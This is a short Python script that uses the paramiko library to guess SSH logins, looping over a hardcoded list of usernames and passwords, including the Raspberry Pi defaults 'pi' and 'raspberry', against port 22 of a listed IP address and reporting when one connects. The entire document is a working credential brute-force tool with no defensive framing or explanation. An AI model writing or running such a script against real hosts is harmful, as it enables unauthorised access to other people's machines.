import paramiko, sys, os, socket
usernames=['pi','username']
passwords=['raspberry','password','Fuck','1234']
ipAddress=['1.1.1.1']
def ssh_connect(host, username, password, code=0):
    ssh=paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    try:
        ssh.connect(host,port=22,username=username,password=password)
    except paramiko.AuthenticationException:
        code=1
    except socket.error:
        code=2

    ssh.close()
    return code
found=False
for x in range(len(usernames)):
    for y in range(len(passwords)):
        if ssh_connect(ipAddress[0], usernames[x], passwords[y])==0:
            print('connected')
            found=True
            break
        else:
            print('wrong')
    if found==True:
        found=False
        break
